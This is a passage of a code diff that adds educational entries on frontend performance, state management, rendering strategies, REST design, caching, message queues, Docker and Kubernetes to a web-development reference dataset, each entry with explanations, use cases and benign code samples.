+      { where: 'News and media sites (CLS prevention)', desc: 'Layout shift happens when ads, images, or embeds load without reserved space and push content down. Reserving space with CSS aspect-ratio or explicit height eliminates this. The NY Times reserves fixed heights for ad slots before they load.' },
+      { where: 'Performance auditing with Lighthouse', desc: 'Lighthouse simulates a mid-tier Android device on slow 4G and measures all Core Web Vitals. It identifies render-blocking resources, unused JS/CSS, unoptimized images, and missing preloads. Used in CI pipelines to catch regressions before deploy.' },
+    ],
+    code: `<span class="cm">&lt;!-- Preload above-the-fold image --&gt;</span>
+&lt;link rel=<span class="str">"preload"</span> href=<span class="str">"/hero.webp"</span> as=<span class="str">"image"</span>&gt;
+
+<span class="cm">&lt;!-- Inline critical CSS (above-the-fold styles) --&gt;</span>
+&lt;style&gt;body{margin:0} .hero{min-height:60vh}&lt;/style&gt;
+
+<span class="cm">&lt;!-- defer: load after HTML parsed, execute in order --&gt;</span>
+&lt;script src=<span class="str">"/app.js"</span> defer&gt;&lt;/script&gt;
+
+<span class="cm">/* Compositor-only animation: GPU-accelerated, no reflow */</span>
+.card {
+  transition: transform <span class="num">200</span>ms, opacity <span class="num">200</span>ms; <span class="cm">/* ✅ */</span>
+}
+.card:hover { transform: <span class="fn">translateY</span>(-<span class="num">4px</span>); }
+
+<span class="cm">/* Reserve space to prevent CLS */</span>
+.image-container { aspect-ratio: <span class="num">16</span> / <span class="num">9</span>; }`,
+    tags: ['LCP', 'CLS', 'INP', 'Core Web Vitals', 'Lighthouse', 'Bundle', 'CDN', 'SSR']
+  },
+  {
+    title: 'State Management',
+    badge: 'Architecture', color: 'red',
+    tagline: 'Organizing where data lives and how it flows through your application.',
+    explanation: `<p>State is any data that can change over time and affects what's rendered. The central challenge in frontend architecture is deciding <strong>where state lives</strong> — this decision determines component coupling, re-render performance, and code maintainability.</p>
+    <p><strong>State colocation</strong> is the core principle: state should live as close to where it's used as possible. Levels of state: (1) <strong>Local state</strong> (<code>useState</code>): only used by one component. (2) <strong>Lifted state</strong>: shared between siblings — moved to their closest common ancestor, passed as props. (3) <strong>Context</strong>: theme, locale, current user — consumed by many components at various depths. (4) <strong>Global store</strong> (Redux, Zustand): complex cross-cutting state, undo/redo, serializable to localStorage.</p>
+    <p><strong>Redux</strong> enforces a strict pattern: a single immutable store, actions describe changes, pure reducers compute next state. Predictable, debuggable with time-travel, but verbose. <strong>Zustand</strong> is a minimal alternative — just a hook with a store. <strong>Jotai/Recoil</strong> use atomic state for fine-grained subscriptions.</p>
+    <div class="highlight"><strong>Server state</strong> (data fetched from APIs) is fundamentally different from client state — it's asynchronous, can be stale, and may be changed by other users. Libraries like <strong>React Query (TanStack Query)</strong> and <strong>SWR</strong> handle caching, background refetching, optimistic updates, and cache invalidation — separating server state from UI state entirely.</div>
+    <p>A mature architecture separates: server state (React Query), URL state (router search params), form state (React Hook Form), and UI state (local useState or Zustand). Don't put everything in Redux — only what genuinely needs to be global.</p>`,
+    usecases: [
+      { where: 'E-commerce shopping cart', desc: 'Cart state is global (accessible from product pages, header badge, checkout). Zustand or Redux stores it, persists to localStorage via middleware. Cart mutations go through actions — easy to debug, easy to add analytics events on every cart change.' },
+      { where: 'Data dashboard with async data', desc: 'A metrics dashboard uses React Query to fetch charts data. React Query caches each query by key, refetches in the background on window focus, shows stale data immediately while loading fresh data, and handles loading/error states declaratively.' },
+      { where: 'Multi-step forms', desc: 'A checkout flow with 4 steps stores form state in React Hook Form (optimized for forms — doesn\'t re-render on each keystroke). Step completion is local state. Submitted order data goes to server state via a mutation.' },
+      { where: 'Real-time collaborative apps', desc: 'In a Figma-like editor, local state tracks the current user\'s cursor and selection. Server state (other users\' changes) comes via WebSocket and is merged into a shared document state using CRDT (Conflict-free Replicated Data Types).' },
+    ],
+    code: `<span class="cm">// Zustand store — simple, no boilerplate</span>
+<span class="kw">const</span> useCart = <span class="fn">create</span>((set) => ({
+  items: [],
+  <span class="fn">addItem</span>: (item) => <span class="fn">set</span>(state => ({
+    items: [...state.items, item]
+  })),
+  <span class="fn">removeItem</span>: (id) => <span class="fn">set</span>(state => ({
+    items: state.items.<span class="fn">filter</span>(i => i.id !== id)
+  })),
+}));
+
+<span class="cm">// React Query — server state, not Redux</span>
+<span class="kw">const</span> { data, isLoading, error } = <span class="fn">useQuery</span>({
+  queryKey: [<span class="str">'posts'</span>, userId],
+  queryFn: () => <span class="fn">fetchPosts</span>(userId),
+  staleTime: <span class="num">5</span> * <span class="num">60</span> * <span class="num">1000</span>, <span class="cm">// cache for 5 minutes</span>
+});
+
+<span class="cm">// Optimistic update: update UI before server confirms</span>
+<span class="kw">const</span> mutation = <span class="fn">useMutation</span>({
+  mutationFn: <span class="fn">likePost</span>,
+  <span class="fn">onMutate</span>: async (postId) => {
+    <span class="kw">await</span> queryClient.<span class="fn">cancelQueries</span>([<span class="str">'posts'</span>]);
+    queryClient.<span class="fn">setQueryData</span>([<span class="str">'posts'</span>], old =>
+      old.<span class="fn">map</span>(p => p.id === postId ? {...p, liked: <span class="kw">true</span>} : p)
+    );
+  }
+});`,
+    tags: ['React', 'Redux', 'Zustand', 'React Query', 'SWR', 'Context API', 'TanStack']
+  },
+  {
+    title: 'SSR, SSG, CSR & ISR',
+    badge: 'Rendering Strategy', color: 'red',
+    tagline: 'Where and when HTML is generated — fundamentally shapes performance, SEO, and architecture.',
+    explanation: `<p>The question of <em>where HTML is generated</em> is one of the most consequential architectural decisions in frontend development. Each strategy has distinct trade-offs.</p>
+    <p><strong>CSR (Client-Side Rendering):</strong> The server sends a nearly empty HTML shell plus a JavaScript bundle. The browser downloads, parses, and executes JS, which then fetches data and renders HTML. First Contentful Paint (FCP) is slow — users see a blank page until JS loads. But once loaded, navigation is instant (no server round-trips). Used by: SPAs, internal dashboards, apps behind login where SEO doesn't matter.</p>
+    <p><strong>SSR (Server-Side Rendering):</strong> On each request, the server runs your React/Vue code, fetches data, and returns fully-rendered HTML. FCP is fast — the browser can display content immediately. The page must then <strong>hydrate</strong> — React attaches event listeners to the server-rendered HTML, making it interactive. Downside: server must handle load, and hydration can be expensive. Used by: e-commerce, news sites, anything needing SEO and fast initial load.</p>
+    <p><strong>SSG (Static Site Generation):</strong> HTML is rendered at <em>build time</em>, not at request time. The resulting static files are deployed to a CDN. Response time is just CDN latency — typically under 50ms globally. No server load. Downside: data can be stale until the next build. Used by: marketing sites, blogs, documentation, product landing pages.</p>
+    <p><strong>ISR (Incremental Static Regeneration):</strong> Next.js innovation. Pages are statically generated but can be regenerated in the background after a configurable TTL (<code>revalidate: 60</code> seconds). Users always get a cached page — never wait for regeneration. Stale data is eventually consistent. Best of SSG and SSR. Used by: e-commerce product pages (prices may change but don't need real-time), news articles.</p>
+    <div class="highlight"><strong>Next.js 13+ App Router</strong> introduced React Server Components — a new model where components render on the server but can be interleaved with client components. Server components have zero JS bundle impact and can directly query databases. The distinction between RSC and hydration is still a learning curve for most developers.</div>`,
+    usecases: [
+      { where: 'Marketing/landing pages (SSG)', desc: 'A SaaS company\'s homepage built with Next.js and SSG builds to static HTML at deploy time. Served from Vercel\'s edge network in 20ms. No server needed. Rebuild triggers on CMS content changes via webhook.' },
+      { where: 'News site (SSR + ISR)', desc: 'The New York Times uses SSR for breaking news (fresh content on every request) and ISR for evergreen articles (regenerated hourly). Fast initial loads, SEO-friendly, manageable server cost.' },
+      { where: 'E-commerce product catalog (ISR)', desc: 'Shopify\'s storefront generates product pages statically, revalidating every 60 seconds. Product pages load instantly from CDN; price/inventory updates propagate within a minute without rebuilding the entire site.' },
+      { where: 'Admin dashboards (CSR)', desc: 'An internal analytics dashboard is behind auth — SEO is irrelevant. It\'s pure CSR: a React SPA that fetches data from a REST API after login. Simpler deployment (just static files), rich client-side interactivity.' },
+    ],
+    code: `<span class="cm">// Next.js App Router — React Server Component (default)</span>
+<span class="cm">// Runs ONLY on server, no client JS, can query DB directly</span>
+<span class="kw">async function</span> <span class="fn">ProductPage</span>({ params }) {
+  <span class="kw">const</span> product = <span class="kw">await</span> db.products.<span class="fn">findById</span>(params.id);
+  <span class="kw">return</span> &lt;ProductView product={product} /&gt;;
+}
+
+<span class="cm">// ISR: static + background revalidation</span>
+<span class="kw">export async function</span> <span class="fn">generateStaticParams</span>() {
+  <span class="kw">return</span> products.<span class="fn">map</span>(p => ({ id: p.id }));
+}
+<span class="kw">export const</span> revalidate = <span class="num">60</span>; <span class="cm">// rebuild every 60s in background</span>
+
+<span class="cm">// CSR: fetch on client, show loading state</span>
+<span class="kw">function</span> <span class="fn">Dashboard</span>() {
+  <span class="kw">const</span> { data } = <span class="fn">useQuery</span>({ queryFn: <span class="fn">fetchStats</span> });
+  <span class="kw">if</span> (!data) <span class="kw">return</span> &lt;Spinner /&gt;;
+  <span class="kw">return</span> &lt;Charts data={data} /&gt;;
+}`,
+    tags: ['Next.js', 'SSR', 'SSG', 'ISR', 'CSR', 'React Server Components', 'Hydration', 'SEO']
+  },
+],
+
+backend: [
+  {
+    title: 'REST API Design',
+    badge: 'Architecture', color: 'blue',
+    tagline: 'Designing HTTP APIs that are predictable, scalable, and a joy to consume.',
+    explanation: `<p><strong>REST (Representational State Transfer)</strong> is an architectural style, not a protocol. Six constraints define it: client-server, stateless, cacheable, uniform interface, layered system, and optionally code on demand. In practice, REST means using HTTP semantics deliberately — <strong>nouns as resources, HTTP methods as verbs, status codes as outcomes</strong>.</p>
+    <p><strong>Resources are nouns, never verbs:</strong> <code>/users</code>, <code>/orders/42/items</code> — not <code>/getUser</code> or <code>/createOrder</code>. Use plural nouns. Nest resources only when a child is always accessed in context of a parent (e.g., <code>/posts/5/comments</code>). For actions that don't map cleanly to CRUD, use a sub-resource noun: <code>POST /orders/42/cancellations</code>.</p>
+    <p><strong>HTTP methods are semantic:</strong> <code>GET</code> = safe + idempotent (read). <code>POST</code> = not idempotent (create). <code>PUT</code> = idempotent (full replace). <code>PATCH</code> = partial update. <code>DELETE</code> = idempotent (remove). Idempotent means calling it N times has the same effect as calling it once — crucial for retry logic.</p>
+    <p><strong>Status codes communicate outcomes:</strong> 200 OK, 201 Created (POST), 204 No Content (DELETE), 400 Bad Request (validation failed — include error details), 401 Unauthorized (not authenticated), 403 Forbidden (authenticated but not allowed), 404 Not Found, 409 Conflict (e.g., duplicate email), 422 Unprocessable (valid JSON but invalid business logic), 429 Too Many Requests, 500 Internal Server Error.</p>
+    <div class="highlight"><strong>Versioning strategy:</strong> URL versioning (<code>/v1/users</code>) is most visible and cache-friendly. Header versioning (<code>Accept: application/vnd.api.v2+json</code>) is cleaner but less discoverable. Never break existing clients — add fields don't remove them, version for breaking changes.</div>
+    <p><strong>Pagination:</strong> cursor-based (most scalable, stable in real-time data) vs offset-based (simple, allow jumping to page N). Include total count, next/prev cursor in response. <strong>Rate limiting headers</strong>: <code>X-RateLimit-Limit</code>, <code>X-RateLimit-Remaining</code>, <code>Retry-After</code>.</p>`,
+    usecases: [
+      { where: 'Mobile app backend', desc: 'A React Native food delivery app hits a REST API. <code>GET /restaurants?lat=37.7&lng=-122.4&radius=5km</code> returns nearby restaurants. <code>POST /orders</code> creates an order. <code>GET /orders/42</code> tracks it. Simple, cacheable, works over flaky mobile networks because GET is idempotent — safe to retry.' },
+      { where: 'Third-party API integrations (Stripe, Twilio)', desc: 'Stripe\'s API is the gold standard of REST design. <code>POST /v1/payment_intents</code> creates a payment. <code>POST /v1/payment_intents/pi_xxx/confirm</code> confirms it. Uses idempotency keys (header) to safely retry failed requests without double-charging.' },
+      { where: 'Microservices communication', desc: 'An order service calls the inventory service\'s <code>POST /reservations</code> to reserve stock. If the call fails, it\'s safe to retry (idempotency key). The inventory service responds with 409 if stock is unavailable, which the order service uses to return a user-facing error.' },
+      { where: 'Public APIs with SDK generation', desc: 'GitHub\'s REST API powers thousands of third-party tools. The consistent resource naming allows OpenAPI spec generation, which then auto-generates client SDKs in 20+ languages. Developers can call <code>octokit.repos.get({owner, repo})</code> in any language.' },
+    ],
+    code: `<span class="cm">// Express REST API — RESTful resource structure</span>
+<span class="kw">const</span> router = express.<span class="fn">Router</span>();
+
+router.<span class="fn">get</span>(<span class="str">'/posts'</span>, <span class="kw">async</span> (req, res) => {
+  <span class="kw">const</span> { cursor, limit = <span class="num">20</span> } = req.query;
+  <span class="kw">const</span> posts = <span class="kw">await</span> Post.<span class="fn">findMany</span>({ cursor, take: +limit });
+  res.<span class="fn">json</span>({ data: posts, nextCursor: posts.<span class="fn">at</span>(-<span class="num">1</span>)?.id });
+});
+
+router.<span class="fn">post</span>(<span class="str">'/posts'</span>, <span class="fn">authenticate</span>, <span class="fn">validate</span>(postSchema), <span class="kw">async</span> (req, res) => {
+  <span class="kw">const</span> post = <span class="kw">await</span> Post.<span class="fn">create</span>({ ...req.body, authorId: req.user.id });
+  res.<span class="fn">status</span>(<span class="num">201</span>).<span class="fn">json</span>(post);  <span class="cm">// 201 Created</span>
+});
+
+router.<span class="fn">patch</span>(<span class="str">'/posts/:id'</span>, <span class="fn">authenticate</span>, <span class="fn">authorize</span>(<span class="str">'owner'</span>), <span class="kw">async</span> (req, res) => {
+  <span class="kw">const</span> post = <span class="kw">await</span> Post.<span class="fn">update</span>({ where: { id: req.params.id }, data: req.body });
+  res.<span class="fn">json</span>(post);
+});
+
+router.<span class="fn">delete</span>(<span class="str">'/posts/:id'</span>, <span class="fn">authenticate</span>, <span class="fn">authorize</span>(<span class="str">'owner'</span>), <span class="kw">async</span> (req, res) => {
+  <span class="kw">await</span> Post.<span class="fn">delete</span>({ where: { id: req.params.id } });
+  res.<span class="fn">status</span>(<span class="num">204</span>).<span class="fn">send</span>();  <span class="cm">// 204 No Content</span>
+});`,
+    tags: ['HTTP', 'Express', 'Node.js', 'OpenAPI', 'Pagination', 'Idempotency', 'Status Codes']
+  },
+  {
+    title: 'Caching Strategies',
+    badge: 'Performance', color: 'blue',
+    tagline: 'The most powerful performance tool in a backend engineer\'s arsenal — and the hardest to get right.',
+    explanation: `<p>Phil Karlton famously said: "There are only two hard things in Computer Science: cache invalidation and naming things." Caching is storing the result of an expensive operation so future requests can reuse it. Done right, it transforms a 200ms DB query into a 1ms Redis lookup. Done wrong, users see stale data.</p>
+    <p><strong>Cache layers in a typical stack:</strong> (1) Browser cache (HTTP headers control TTL). (2) CDN/Edge cache (Cloudflare caches entire responses at edge PoPs globally). (3) Reverse proxy cache (Nginx or Varnish in front of app servers). (4) Application cache (Redis/Memcached — most flexible). (5) Database query cache (usually disabled in production due to overhead). (6) CPU caches (L1/L2/L3 — handled by hardware).</p>
+    <p><strong>Cache patterns:</strong> <strong>Cache-Aside (Lazy Loading)</strong>: Check cache → if miss, query DB → store in cache → return. Application controls cache explicitly. <strong>Write-Through</strong>: Write to cache and DB simultaneously. Cache is always fresh. Write latency doubles. <strong>Write-Behind (Write-Back)</strong>: Write to cache, asynchronously flush to DB. Fastest writes, risk of data loss. <strong>Read-Through</strong>: Cache sits in front of DB, fills itself on miss. Application sees only the cache.</p>
+    <div class="highlight"><strong>Cache invalidation strategies:</strong> (1) <strong>TTL (Time-to-Live)</strong>: cache expires after N seconds. Simple but data can be stale up to TTL. (2) <strong>Event-based invalidation</strong>: when data changes, publish an event that deletes/updates the cache key. More complex but always fresh. (3) <strong>Cache versioning</strong>: embed a version in the cache key (<code>user:42:v3</code>). Change version to invalidate.</div>
+    <p><strong>HTTP caching headers:</strong> <code>Cache-Control: max-age=3600</code> (client caches for 1 hour), <code>Cache-Control: s-maxage=86400</code> (CDN caches for 1 day), <code>ETag</code> (server sends a fingerprint; client sends <code>If-None-Match</code> header; server returns 304 Not Modified if unchanged). <code>Vary</code> header tells CDN to cache separate copies per Accept-Encoding, Accept-Language, etc.</p>`,
+    usecases: [
+      { where: 'User profile API (Redis Cache-Aside)', desc: 'GitHub profiles are read thousands of times more than they\'re written. The API checks Redis for <code>user:profile:42</code>. On miss, it queries Postgres and stores in Redis with a 5-minute TTL. Profile updates explicitly delete the cache key. Profile reads: ~1ms. Without cache: ~20ms DB query.' },
+      { where: 'CDN caching for static assets', desc: 'A Next.js app deploys JS bundles with content-hash filenames (<code>main.abc123.js</code>). These are immutable — set <code>Cache-Control: max-age=31536000, immutable</code>. Browsers and CDN cache forever. On next deploy, new hash = new URL = cache bypass. Zero stale asset issues.' },
+      { where: 'Rate limiting with Redis', desc: 'Rate limiting uses Redis\'s atomic increment: <code>INCR ratelimit:user:42</code> and <code>EXPIRE</code>. If count exceeds limit, return 429. Redis processes ~100k ops/sec — far cheaper than a DB query on every API call.' },
+      { where: 'Session storage', desc: 'Express sessions stored in Redis (connect-redis) allow horizontal scaling. Any app server can handle any request — session is fetched from shared Redis. Without Redis, sessions would be in-memory and a load balancer would need sticky sessions.' },
+    ],
+    code: `<span class="cm">// Cache-aside pattern in Node.js with Redis</span>
+<span class="kw">async function</span> <span class="fn">getUser</span>(id) {
+  <span class="kw">const</span> cacheKey = <span class="str">\`user:\${id}\`</span>;
+  
+  <span class="cm">// 1. Check cache</span>
+  <span class="kw">const</span> cached = <span class="kw">await</span> redis.<span class="fn">get</span>(cacheKey);
+  <span class="kw">if</span> (cached) <span class="kw">return</span> JSON.<span class="fn">parse</span>(cached);
+  
+  <span class="cm">// 2. Cache miss: query DB</span>
+  <span class="kw">const</span> user = <span class="kw">await</span> db.users.<span class="fn">findById</span>(id);
+  
+  <span class="cm">// 3. Store in cache with TTL</span>
+  <span class="kw">await</span> redis.<span class="fn">setEx</span>(cacheKey, <span class="num">300</span>, JSON.<span class="fn">stringify</span>(user)); <span class="cm">// 5 min</span>
+  
+  <span class="kw">return</span> user;
+}
+
+<span class="cm">// Invalidate on update</span>
+<span class="kw">async function</span> <span class="fn">updateUser</span>(id, data) {
+  <span class="kw">await</span> db.users.<span class="fn">update</span>({ where: { id }, data });
+  <span class="kw">await</span> redis.<span class="fn">del</span>(<span class="str">\`user:\${id}\`</span>);  <span class="cm">// bust cache</span>
+}
+
+<span class="cm">// HTTP caching: immutable assets</span>
+<span class="cm">// Cache-Control: public, max-age=31536000, immutable</span>`,
+    tags: ['Redis', 'Memcached', 'Cache-Control', 'CDN', 'TTL', 'ETag', 'Performance']
+  },
+  {
+    title: 'Message Queues & Event-Driven Architecture',
+    badge: 'Architecture', color: 'blue',
+    tagline: 'Decoupling services with async messaging — the backbone of resilient distributed systems.',
+    explanation: `<p>When Service A needs to notify Service B, the naive approach is a direct HTTP call. This creates <strong>temporal coupling</strong> — if B is down or slow, A fails or waits. Message queues solve this: A drops a message in a queue and returns immediately. B processes it when ready. They are now <strong>decoupled in time</strong>.</p>
+    <p><strong>Core concepts:</strong> <strong>Producer</strong> sends messages. <strong>Queue/Topic</strong> buffers them durably. <strong>Consumer</strong> processes them. Message acknowledgment (ack) tells the queue the message was processed successfully — if the consumer crashes before acking, the message is redelivered. <strong>Dead Letter Queue (DLQ)</strong> catches messages that repeatedly fail processing — for inspection and manual intervention.</p>
+    <p><strong>Competing consumers pattern:</strong> Multiple consumer instances read from the same queue. Each message goes to exactly one consumer. This is how you scale processing horizontally — add more consumers to process faster. Used for background job processing (image resizing, email sending, report generation).</p>
+    <p><strong>Pub/Sub pattern:</strong> Messages are published to a <em>topic</em> and broadcast to all subscribers. An "order created" event might be consumed by the inventory service (reserve stock), notification service (send email), and analytics service (log conversion) — all independently, without the order service knowing about any of them.</p>
+    <div class="highlight"><strong>Kafka vs RabbitMQ:</strong> RabbitMQ is a traditional message broker — messages are pushed to consumers, deleted after ack. Great for task queues. Kafka is a distributed log — messages are retained durably for days/weeks. Consumers read at their own pace using offsets. Multiple independent consumer groups can replay the same events. Essential for event sourcing, stream processing, and audit logs.</div>`,
+    usecases: [
+      { where: 'Email/notification sending (background jobs)', desc: 'After a user signs up, your API puts a "send welcome email" job in a Bull (Redis-backed) queue and returns 201 immediately. A worker process picks it up, calls SendGrid, retries on failure. User gets instant response; email arrives seconds later. Spikes in signups don\'t overwhelm the email service.' },
+      { where: 'Image/video processing pipelines', desc: 'When a user uploads a profile photo, the upload endpoint stores raw image in S3 and enqueues a job. Workers pull jobs, generate thumbnails in 3 sizes, run face detection, update the DB. Users see a "processing" state until workers finish. Multiple workers run in parallel for scale.' },
+      { where: 'Microservice event bus (order workflow)', desc: 'Order service publishes "order.created" to Kafka. Inventory service consumes it and reserves stock. Payment service consumes it and charges card. Fulfillment service consumes it and schedules shipping. Each service operates independently — no direct coupling between any of them.' },
+      { where: 'Real-time analytics pipeline', desc: 'Every page view, click, and conversion event is published to Kafka. Flink or Spark reads the stream, aggregates metrics per minute, and writes results to a time-series DB. The product dashboard shows live data with 60-second lag. Traditional DB inserts couldn\'t handle 100k events/second.' },
+    ],
+    code: `<span class="cm">// Bull queue (Redis-backed) — background job processing</span>
+<span class="kw">import</span> Bull <span class="kw">from</span> <span class="str">'bull'</span>;
+
+<span class="kw">const</span> emailQueue = <span class="kw">new</span> <span class="fn">Bull</span>(<span class="str">'email'</span>, { redis: REDIS_URL });
+
+<span class="cm">// Producer: enqueue job and return immediately</span>
+app.<span class="fn">post</span>(<span class="str">'/register'</span>, <span class="kw">async</span> (req, res) => {
+  <span class="kw">const</span> user = <span class="kw">await</span> User.<span class="fn">create</span>(req.body);
+  <span class="kw">await</span> emailQueue.<span class="fn">add</span>({ userId: user.id, type: <span class="str">'welcome'</span> }, {
+    attempts: <span class="num">3</span>,           <span class="cm">// retry up to 3 times</span>
+    backoff: <span class="num">5000</span>,        <span class="cm">// wait 5s between retries</span>
+    removeOnComplete: <span class="kw">true</span>
+  });
+  res.<span class="fn">status</span>(<span class="num">201</span>).<span class="fn">json</span>(user); <span class="cm">// instant response</span>
+});
+
+<span class="cm">// Consumer: worker process (separate dyno/pod)</span>
+emailQueue.<span class="fn">process</span>(<span class="kw">async</span> (job) => {
+  <span class="kw">const</span> { userId, type } = job.data;
+  <span class="kw">const</span> user = <span class="kw">await</span> User.<span class="fn">findById</span>(userId);
+  <span class="kw">await</span> sendgrid.<span class="fn">send</span>({ to: user.email, template: type });
+  <span class="cm">// auto-acks on resolve, nacks + retries on throw</span>
+});`,
+    tags: ['Redis', 'Bull', 'Kafka', 'RabbitMQ', 'Pub/Sub', 'Event-Driven', 'Background Jobs']
+  },
+],
+
+devops: [
+  {
+    title: 'Docker & Containerization',
+    badge: 'Infrastructure', color: 'green',
+    tagline: 'Packaging applications with their entire runtime environment for consistent, portable deployment.',
+    explanation: `<p>Before Docker, the phrase "works on my machine" was an industry-wide problem. Different OS versions, different library versions, different environment variables — what runs on a developer's laptop might break in staging and crash in production. Docker solves this by packaging the application <em>and its entire runtime environment</em> into a <strong>container image</strong>.</p>
+    <p>A <strong>Dockerfile</strong> is a recipe for building an image. Each instruction (<code>FROM</code>, <code>RUN</code>, <code>COPY</code>, <code>CMD</code>) adds a <strong>layer</strong> on top of the previous. Layers are cached — if a layer's instruction hasn't changed, Docker reuses the cached version. This is why you <code>COPY package.json</code> and <code>RUN npm install</code> <em>before</em> copying the rest of the source code — so dependency installation is cached as long as package.json doesn't change.</p>
+    <p>A <strong>container</strong> is a running instance of an image. It has its own filesystem, network namespace, and process namespace — isolated from the host and other containers. Containers share the host OS kernel (unlike VMs which have their own OS), making them lightweight and fast-starting (milliseconds vs minutes for VMs).</p>
+    <div class="highlight"><strong>Multi-stage builds</strong> dramatically reduce image size. A build stage installs all dev dependencies and compiles code. The final stage copies only the compiled artifact from the build stage into a minimal base image (Alpine Linux). A Node.js app might go from 1.2GB to 150MB — smaller images = faster pulls = faster deploys = smaller attack surface.</div>
+    <p><strong>Docker networking:</strong> containers in the same <code>docker-compose</code> network can reach each other by service name (DNS resolution). The app container connects to <code>postgres:5432</code> because Docker provides internal DNS. <strong>Volumes</strong> mount host directories or named volumes into the container filesystem — used for persistent data (databases) and hot reloading in development.</p>`,
+    usecases: [
+      { where: 'Consistent dev environments', desc: 'A <code>docker-compose.yml</code> defines the full stack: app server, Postgres, Redis, and an Nginx proxy. New team members run <code>docker compose up</code> and have a fully working environment in minutes — identical to staging and production. No "it works on my machine" issues.' },
+      { where: 'CI/CD pipelines', desc: 'GitHub Actions builds a Docker image on every push, runs tests inside the container, pushes the image to ECR (AWS container registry), and triggers a Kubernetes rolling deployment. The container image is the deployable artifact — guaranteeing what was tested is what runs in production.' },
+      { where: 'Microservices isolation', desc: 'Each microservice has its own Dockerfile and Docker image. The payment service runs Python 3.11; the recommendation service runs Go 1.21; the legacy service runs Node 14. All coexist without dependency conflicts because each container has its own isolated environment.' },
+      { where: 'Database isolation in testing', desc: 'Integration tests spin up a throwaway Postgres container, run migrations, run tests, then destroy the container. Tests are hermetic — never interfere with shared databases. Libraries like Testcontainers automate this pattern.' },
+    ],
+    code: `<span class="cm"># Multi-stage Dockerfile for Node.js app</span>
+
+<span class="cm"># Stage 1: Build</span>
+<span class="kw">FROM</span> node:20-alpine AS builder
+<span class="kw">WORKDIR</span> /app
+<span class="kw">COPY</span> package*.json ./          <span class="cm"># Copy only package files first</span>
+<span class="kw">RUN</span> npm ci --frozen-lockfile   <span class="cm"># Layer cached unless package.json changes</span>
+<span class="kw">COPY</span> . .
+<span class="kw">RUN</span> npm run build
+
+<span class="cm"># Stage 2: Production (minimal image)</span>
+<span class="kw">FROM</span> node:20-alpine
+<span class="kw">WORKDIR</span> /app
+<span class="kw">COPY</span> --from=builder /app/dist ./dist
+<span class="kw">COPY</span> --from=builder /app/node_modules ./node_modules
+<span class="kw">EXPOSE</span> 3000
+<span class="kw">USER</span> node              <span class="cm"># don't run as root!</span>
+<span class="kw">CMD</span> ["node", "dist/server.js"]
+
+<span class="cm"># docker-compose.yml development setup</span>
+<span class="cm"># services:</span>
+<span class="cm">#   app: { build: ., volumes: ['.:/app'] }  ← hot reload</span>
+<span class="cm">#   db:  { image: postgres:16, volumes: ['pgdata:/var/lib/postgresql/data'] }</span>`,
+    tags: ['Docker', 'Containers', 'Dockerfile', 'Docker Compose', 'Alpine', 'CI/CD', 'Multi-stage']
+  },
+  {
+    title: 'Kubernetes',
+    badge: 'Orchestration', color: 'green',
+    tagline: 'Automating deployment, scaling, and management of containerized applications at scale.',
+    explanation: `<p>Running a container with <code>docker run</code> is fine for one instance. But production needs: "always run exactly 3 instances of my API, restart them if they crash, roll out updates without downtime, scale to 20 during traffic spikes, route traffic via a load balancer, and inject secrets securely." That's Kubernetes.</p>
+    <p><strong>Core abstractions:</strong> A <strong>Pod</strong> is the atomic unit — one or more tightly coupled containers sharing a network namespace and storage. A <strong>Deployment</strong> declares desired state: "run 3 replicas of this pod." The controller constantly reconciles actual vs desired state — if a pod crashes, it creates a new one. A <strong>Service</strong> provides a stable DNS name and IP that load-balances across pod replicas (which have ephemeral IPs). An <strong>Ingress</strong> routes external HTTP traffic to Services by hostname/path.</p>
+    <p><strong>Control plane vs Data plane:</strong> The control plane (API server, scheduler, etcd, controller manager) manages cluster state. Worker nodes run <code>kubelet</code> (node agent) and <code>kube-proxy</code> (networking). <code>etcd</code> is the distributed key-value store holding all cluster state — its availability is critical.</p>
+    <div class="highlight"><strong>Rolling deployments:</strong> When you update a Deployment's image, Kubernetes creates new pods with the new image one at a time, waits for them to pass health checks, then terminates old pods. Zero downtime. You can set <code>maxSurge</code> (how many extra pods) and <code>maxUnavailable</code> (how many can be down). Bad deploy? <code>kubectl rollout undo</code> reverts in seconds.</div>
+    <p><strong>Resource requests and limits:</strong> Each container declares CPU/memory requests (what it needs, used for scheduling) and limits (hard cap). The scheduler uses requests to bin-pack pods onto nodes optimally. <strong>HPA (Horizontal Pod Autoscaler)</strong> watches metrics (CPU, custom) and scales replica count automatically.</p>`,
+    usecases: [
+      { where: 'Scaling a web API for traffic spikes', desc: 'An HPA watches the API deployment\'s average CPU. During a product launch, CPU crosses 70% threshold. HPA scales from 3 to 20 pods in under a minute. The Service automatically load-balances across all 20. After the spike, HPA scales back down to save cost.' },
+      { where: 'Zero-downtime deployments', desc: 'A team pushes a new image tag to their deployment every week. K8s does a rolling update: creates 1 new pod, waits for its readiness probe to pass (HTTP /health returns 200), then terminates 1 old pod. Repeats until all pods are updated. Users experience no downtime.' },
+      { where: 'Multi-tenant SaaS platform', desc: 'Each customer gets their own Kubernetes namespace. ResourceQuotas limit CPU/memory per namespace. NetworkPolicies restrict inter-namespace traffic. RBAC controls which team members can access which namespaces. One cluster serves many customers with isolation.' },
+      { where: 'ML model serving', desc: 'A PyTorch model is packaged in a Docker image and deployed as a K8s Deployment with GPU resource requests (<code>nvidia.com/gpu: 1</code>). The scheduler places it on GPU-equipped nodes. Multiple versions run simultaneously (Canary deployment) with traffic split by an Istio VirtualService.' },
+    ],
+    code: `<span class="cm"># deployment.yaml</span>
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: api
+spec:
+  replicas: 3
+  selector:
+    matchLabels: { app: api }
+  strategy:
+    rollingUpdate:
+      maxSurge: 1
+      maxUnavailable: 0       <span class="cm"># always maintain full capacity</span>
+  template:
+    spec:
+      containers:
+      - name: api
+        image: myapp/api:v2.1.0
+        resources:
+          requests: { cpu: 250m, memory: 256Mi }
+          limits:   { cpu: 500m, memory: 512Mi }
+        readinessProbe:
+          httpGet: { path: /health, port: 3000 }
+          initialDelaySeconds: 5
+        env:
+        - name: DB_PASSWORD
+          valueFrom:
+            secretKeyRef: { name: db-secret, key: password }
+
+<span class="cm"># hpa.yaml — auto-scale on CPU</span>
+<span class="cm"># minReplicas: 3, maxReplicas: 20, targetCPUUtilization: 70%</span>`,
+    tags: ['Kubernetes', 'K8s', 'Pods', 'Deployments', 'HPA', 'Services', 'Ingress', 'Helm']
+  },
+  {
+    title: 'CI/CD Pipelines',
+    badge: 'Automation', color: 'green',
+    tagline: 'Automating the journey from code commit to production deployment safely and repeatably.',
